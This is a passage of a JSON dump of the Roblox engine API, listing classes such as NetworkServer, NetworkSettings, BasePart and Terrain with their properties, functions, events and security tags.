lient","type":"Event"},{"Superclass":"NetworkPeer","type":"Class","Name":"NetworkServer","tags":["notCreatable"]},{"ValueType":"int","type":"Property","Name":"Port","tags":["readonly"],"Class":"NetworkServer"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsCloudEditServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConfigureAsTeamTestServer","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"GetClientCount","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetIsPlayerAuthenticationRequired","tags":["RobloxSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"port","Default":"0"},{"Type":"int","Name":"threadSleepTime","Default":"20"}],"Name":"Start","tags":["PluginSecurity"],"Class":"NetworkServer","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"blockDuration","Default":"1000"}],"Name":"Stop","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Function"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataBasicFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"Instance"},{"Name":"result","Type":"FilterResult"},{"Name":"instance","Type":"Instance"},{"Name":"member","Type":"string"}],"Name":"DataCustomFiltered","tags":["LocalUserSecurity"],"Class":"NetworkServer","type":"Event"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"replicator","Type":"Instance"}],"Name":"IncommingConnection","tags":["RobloxScriptSecurity"],"Class":"NetworkServer","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"NetworkReplicator","tags":["notCreatable"]},{"ValueType":"string","type":"Property","Name":"MachineAddress","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ValueType":"int","type":"Property","Name":"Port","tags":["LocalUserSecurity","readonly"],"Class":"NetworkReplicator"},{"ReturnType":"void","Arguments":[],"Name":"CloseConnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"DisableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"EnableProcessPackets","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetPlayer","tags":[],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"string","Arguments":[{"Type":"int","Name":"verbosityLevel","Default":"0"}],"Name":"GetRakStatsString","tags":["PluginSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"RequestCharacter","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"SendMarker","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"double","Name":"seconds","Default":null}],"Name":"SetPropSyncExpiration","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Function"},{"Arguments":[{"Name":"peer","Type":"string"},{"Name":"lostConnection","Type":"bool"}],"Name":"Disconnection","tags":["LocalUserSecurity"],"Class":"NetworkReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ClientReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"request","Default":null}],"Name":"RequestServerStats","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Function"},{"Arguments":[{"Name":"stats","Type":"Dictionary"}],"Name":"StatsReceived","tags":["RobloxScriptSecurity"],"Class":"ClientReplicator","type":"Event"},{"Superclass":"NetworkReplicator","type":"Class","Name":"ServerReplicator","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[],"Name":"PreventTerrainChanges","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"bool","Name":"value","Default":null}],"Name":"SetBasicFilteringEnabled","tags":["RobloxPlaceSecurity"],"Class":"ServerReplicator","type":"Function"},{"Arguments":[{"Name":"userId","Type":"int"},{"Name":"isAuthenticated","Type":"bool"},{"Name":"protocolVersion","Type":"int"}],"Name":"TicketProcessed","tags":[],"Class":"ServerReplicator","type":"Event"},{"ReturnType":"FilterResult","Arguments":[{"Name":"deletingItem","Type":"Instance"}],"Name":"DeleteFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"firingItem","Type":"Instance"},{"Name":"event","Type":"string"}],"Name":"EventFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"newItem","Type":"Instance"},{"Name":"parent","Type":"Instance"}],"Name":"NewFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"ReturnType":"FilterResult","Arguments":[{"Name":"changingItem","Type":"Instance"},{"Name":"member","Type":"string"},{"Name":"value","Type":"Variant"}],"Name":"PropertyFilter","tags":["RobloxPlaceSecurity","noyield"],"Class":"ServerReplicator","type":"Callback"},{"Superclass":"Instance","type":"Class","Name":"NetworkSettings","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"ArePhysicsRejectionsReported","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"CanSendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"ClientPhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataGCRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"DataMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"DataSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"DataSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"EnableHeavyCompression","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ExperimentalPhysicsEnabled","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"ExtraMemoryUsed","tags":["PluginSecurity","hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"FreeMemoryPoolMBytes","tags":["PluginSecurity","hidden","readonly"],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"IncommingReplicationLag","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsQueueErrorComputed","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByCongestionControl","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"IsThrottledByOutgoingBandwidthLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"MaxDataModelSendBuffer","tags":["deprecated"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"NetworkOwnerRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PhysicsMtuAdjust","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsReceiveMethod","type":"Property","Name":"PhysicsReceive","tags":[],"Class":"NetworkSettings"},{"ValueType":"PhysicsSendMethod","type":"Property","Name":"PhysicsSend","tags":[],"Class":"NetworkSettings"},{"ValueType":"PacketPriority","type":"Property","Name":"PhysicsSendPriority","tags":["hidden"],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"PhysicsSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"PreferredClientPort","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintBits","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintEvents","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintFilters","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintInstances","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintPhysicsErrors","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintProperties","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintSplitMessage","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintStreamInstanceQuota","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"PrintTouches","tags":[],"Class":"NetworkSettings"},{"ValueType":"double","type":"Property","Name":"ReceiveRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"RenderStreamedRegions","tags":[],"Class":"NetworkSettings"},{"ValueType":"string","type":"Property","Name":"ReportStatURL","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"SendPacketBufferLimit","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowActiveAnimationAsset","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"ShowPartMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"TotalNumMovementWayPoint","tags":[],"Class":"NetworkSettings"},{"ValueType":"float","type":"Property","Name":"TouchSendRate","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackDataTypes","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"TrackPhysicsDetails","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UseInstancePacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"bool","type":"Property","Name":"UsePhysicsPacketCache","tags":[],"Class":"NetworkSettings"},{"ValueType":"int","type":"Property","Name":"WaitingForCharacterLogRate","tags":["deprecated","hidden"],"Class":"NetworkSettings"},{"Superclass":"Instance","type":"Class","Name":"NotificationService","tags":["notCreatable"]},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"CancelAllNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null}],"Name":"CancelNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"userId","Default":null},{"Type":"int","Name":"alertId","Default":null},{"Type":"string","Name":"alertMsg","Default":null},{"Type":"int","Name":"minutesToFire","Default":null}],"Name":"ScheduleNotification","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"Function"},{"ReturnType":"Array","Arguments":[{"Type":"int","Name":"userId","Default":null}],"Name":"GetScheduledNotifications","tags":["RobloxPlaceSecurity"],"Class":"NotificationService","type":"YieldFunction"},{"Superclass":"Instance","type":"Class","Name":"NumberValue","tags":[]},{"ValueType":"double","type":"Property","Name":"Value","tags":[],"Class":"NumberValue"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"Changed","tags":[],"Class":"NumberValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"double"}],"Name":"changed","tags":["deprecated"],"Class":"NumberValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"ObjectValue","tags":[]},{"ValueType":"Object","type":"Property","Name":"Value","tags":[],"Class":"ObjectValue"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"Changed","tags":[],"Class":"ObjectValue","type":"Event"},{"Arguments":[{"Name":"value","Type":"Instance"}],"Name":"changed","tags":["deprecated"],"Class":"ObjectValue","type":"Event"},{"Superclass":"Instance","type":"Class","Name":"OneQuarterClusterPacketCacheBase","tags":[]},{"Superclass":"Instance","type":"Class","Name":"PVInstance","tags":["notbrowsable"]},{"ValueType":"CoordinateFrame","type":"Property","Name":"CoordinateFrame","tags":["deprecated","writeonly"],"Class":"PVInstance"},{"Superclass":"PVInstance","type":"Class","Name":"BasePart","tags":["notbrowsable"]},{"ValueType":"bool","type":"Property","Name":"Anchored","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BackParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BackSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BackSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"BottomParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"BottomSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"BottomSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"BrickColor","tags":[],"Class":"BasePart"},{"ValueType":"CoordinateFrame","type":"Property","Name":"CFrame","tags":[],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"CanCollide","tags":[],"Class":"BasePart"},{"ValueType":"Color3","type":"Property","Name":"Color","tags":["deprecated"],"Class":"BasePart"},{"ValueType":"PhysicalProperties","type":"Property","Name":"CustomPhysicalProperties","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Elasticity","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Friction","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"FrontParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"FrontSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"FrontSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LeftParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"LeftSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"LeftSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"LocalTransparencyModifier","tags":["hidden"],"Class":"BasePart"},{"ValueType":"bool","type":"Property","Name":"Locked","tags":[],"Class":"BasePart"},{"ValueType":"Material","type":"Property","Name":"Material","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Position","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"ReceiveAge","tags":["hidden","readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Reflectance","tags":[],"Class":"BasePart"},{"ValueType":"int","type":"Property","Name":"ResizeIncrement","tags":["readonly"],"Class":"BasePart"},{"ValueType":"Faces","type":"Property","Name":"ResizeableFaces","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"RightParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"RightSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"RightSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"RotVelocity","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Rotation","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Size","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"SpecificGravity","tags":["readonly"],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamA","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"TopParamB","tags":[],"Class":"BasePart"},{"ValueType":"SurfaceType","type":"Property","Name":"TopSurface","tags":[],"Class":"BasePart"},{"ValueType":"InputType","type":"Property","Name":"TopSurfaceInput","tags":[],"Class":"BasePart"},{"ValueType":"float","type":"Property","Name":"Transparency","tags":[],"Class":"BasePart"},{"ValueType":"Vector3","type":"Property","Name":"Velocity","tags":[],"Class":"BasePart"},{"ValueType":"BrickColor","type":"Property","Name":"brickColor","tags":["deprecated"],"Class":"BasePart"},{"ReturnType":"void","Arguments":[],"Name":"BreakJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Tuple","Arguments":[],"Name":"CanSetNetworkOwnership","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[{"Type":"bool","Name":"recursive","Default":"false"}],"Name":"GetConnectedParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"GetMass","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"GetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"CoordinateFrame","Arguments":[],"Name":"GetRenderCFrame","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Instance","Arguments":[],"Name":"GetRootPart","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"Objects","Arguments":[],"Name":"GetTouchingParts","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[],"Name":"IsGrounded","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"MakeJoints","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"Resize","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"playerInstance","Default":"nil"}],"Name":"SetNetworkOwner","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"SetNetworkOwnershipAuto","tags":[],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"breakJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"float","Arguments":[],"Name":"getMass","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"makeJoints","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"ReturnType":"bool","Arguments":[{"Type":"NormalId","Name":"normalId","Default":null},{"Type":"int","Name":"deltaAmount","Default":null}],"Name":"resize","tags":["deprecated"],"Class":"BasePart","type":"Function"},{"Arguments":[{"Name":"part","Type":"Instance"}],"Name":"LocalSimulationTouched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[],"Name":"OutfitChanged","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"StoppedTouching","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"TouchEnded","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"Touched","tags":[],"Class":"BasePart","type":"Event"},{"Arguments":[{"Name":"otherPart","Type":"Instance"}],"Name":"touched","tags":["deprecated"],"Class":"BasePart","type":"Event"},{"Superclass":"BasePart","type":"Class","Name":"CornerWedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"FormFactorPart","tags":[]},{"ValueType":"FormFactor","type":"Property","Name":"FormFactor","tags":["deprecated"],"Class":"FormFactorPart"},{"ValueType":"FormFactor","type":"Property","Name":"formFactor","tags":["deprecated","hidden"],"Class":"FormFactorPart"},{"Superclass":"FormFactorPart","type":"Class","Name":"Part","tags":[]},{"ValueType":"PartType","type":"Property","Name":"Shape","tags":[],"Class":"Part"},{"Superclass":"Part","type":"Class","Name":"FlagStand","tags":["deprecated"]},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"FlagStand"},{"Arguments":[{"Name":"player","Type":"Instance"}],"Name":"FlagCaptured","tags":[],"Class":"FlagStand","type":"Event"},{"Superclass":"Part","type":"Class","Name":"Platform","tags":[]},{"Superclass":"Part","type":"Class","Name":"Seat","tags":[]},{"ValueType":"bool","type":"Property","Name":"Disabled","tags":[],"Class":"Seat"},{"ValueType":"Object","type":"Property","Name":"Occupant","tags":["readonly"],"Class":"Seat"},{"Superclass":"Part","type":"Class","Name":"SkateboardPlatform","tags":["deprecated"]},{"ValueType":"Object","type":"Property","Name":"Controller","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"Object","type":"Property","Name":"ControllingHumanoid","tags":["readonly"],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Steer","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"bool","type":"Property","Name":"StickyWheels","tags":[],"Class":"SkateboardPlatform"},{"ValueType":"int","type":"Property","Name":"Throttle","tags":[],"Class":"SkateboardPlatform"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"impulseWorld","Default":null}],"Name":"ApplySpecificImpulse","tags":[],"Class":"SkateboardPlatform","type":"Function"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"Equipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"newState","Type":"MoveState"},{"Name":"oldState","Type":"MoveState"}],"Name":"MoveStateChanged","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"Unequipped","tags":[],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"},{"Name":"skateboardController","Type":"Instance"}],"Name":"equipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Arguments":[{"Name":"humanoid","Type":"Instance"}],"Name":"unequipped","tags":["deprecated"],"Class":"SkateboardPlatform","type":"Event"},{"Superclass":"Part","type":"Class","Name":"SpawnLocation","tags":[]},{"ValueType":"bool","type":"Property","Name":"AllowTeamChangeOnTouch","tags":[],"Class":"SpawnLocation"},{"ValueType":"int","type":"Property","Name":"Duration","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Enabled","tags":[],"Class":"SpawnLocation"},{"ValueType":"bool","type":"Property","Name":"Neutral","tags":[],"Class":"SpawnLocation"},{"ValueType":"BrickColor","type":"Property","Name":"TeamColor","tags":[],"Class":"SpawnLocation"},{"Superclass":"FormFactorPart","type":"Class","Name":"WedgePart","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"MeshPart","tags":[]},{"ValueType":"Material","type":"Property","Name":"Material","tags":["deprecated","readonly"],"Class":"MeshPart"},{"ValueType":"Content","type":"Property","Name":"TextureID","tags":[],"Class":"MeshPart"},{"Superclass":"BasePart","type":"Class","Name":"ParallelRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"PartOperation","tags":[]},{"ValueType":"bool","type":"Property","Name":"UsePartColor","tags":[],"Class":"PartOperation"},{"Superclass":"PartOperation","type":"Class","Name":"NegateOperation","tags":[]},{"Superclass":"PartOperation","type":"Class","Name":"UnionOperation","tags":[]},{"Superclass":"BasePart","type":"Class","Name":"PrismPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PrismSides","type":"Property","Name":"Sides","tags":[],"Class":"PrismPart"},{"Superclass":"BasePart","type":"Class","Name":"PyramidPart","tags":["deprecated","notbrowsable"]},{"ValueType":"PyramidSides","type":"Property","Name":"Sides","tags":[],"Class":"PyramidPart"},{"Superclass":"BasePart","type":"Class","Name":"RightAngleRampPart","tags":["deprecated","notbrowsable"]},{"Superclass":"BasePart","type":"Class","Name":"Terrain","tags":["notCreatable"]},{"ValueType":"bool","type":"Property","Name":"IsSmooth","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Region3int16","type":"Property","Name":"MaxExtents","tags":["readonly"],"Class":"Terrain"},{"ValueType":"Color3","type":"Property","Name":"WaterColor","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterTransparency","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSize","tags":[],"Class":"Terrain"},{"ValueType":"float","type":"Property","Name":"WaterWaveSpeed","tags":[],"Class":"Terrain"},{"ReturnType":"bool","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"AutowedgeCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"AutowedgeCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCenterToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"CellCornerToWorld","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"Clear","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[],"Name":"ConvertToSmooth","tags":["PluginSecurity"],"Class":"Terrain","type":"Function"},{"ReturnType":"Instance","Arguments":[{"Type":"Region3int16","Name":"region","Default":null}],"Name":"CopyRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"int","Arguments":[],"Name":"CountCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Vector3","Name":"center","Default":null},{"Type":"float","Name":"radius","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBall","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"CoordinateFrame","Name":"cframe","Default":null},{"Type":"Vector3","Name":"size","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillBlock","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Material","Name":"material","Default":null}],"Name":"FillRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null}],"Name":"GetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Instance","Name":"region","Default":null},{"Type":"Vector3int16","Name":"corner","Default":null},{"Type":"bool","Name":"pasteEmptyCells","Default":null}],"Name":"PasteRegion","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Tuple","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null}],"Name":"ReadVoxels","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3int16","Name":"region","Default":null},{"Type":"CellMaterial","Name":"material","Default":null},{"Type":"CellBlock","Name":"block","Default":null},{"Type":"CellOrientation","Name":"orientation","Default":null}],"Name":"SetCells","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"int","Name":"x","Default":null},{"Type":"int","Name":"y","Default":null},{"Type":"int","Name":"z","Default":null},{"Type":"WaterForce","Name":"force","Default":null},{"Type":"WaterDirection","Name":"direction","Default":null}],"Name":"SetWaterCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCell","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferEmpty","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"Vector3","Arguments":[{"Type":"Vector3","Name":"position","Default":null}],"Name":"WorldToCellPreferSolid","tags":[],"Class":"Terrain","type":"Function"},{"ReturnType":"void","Arguments":[{"Type":"Region3","Name":"region","Default":null},{"Type":"float","Name":"resolution","Default":null},{"Type":"Array","Name":"materials","Default":null},{"Type":"Array","Name":"occupancy","Default":null}],"Name":"WriteVoxels","tags":[],"Class":"Terrain","type":"Function"},{"Superclass":"BasePart","type":"Class","Name":"TrussPart","tags":[]},{"ValueType":"Style","type":"Property","Name":"Style","tags":[],"Class":"TrussPart"},{"Superclass":"BasePart","type":"Class","Name":"VehicleSeat","tags":[]},{"ValueType":"int","type":"Property","Name":"AreHingesDetected","tags":["readonly"],"Class":"VehicleSeat"},{"ValueType":"bool","type":"Property","Name":"Di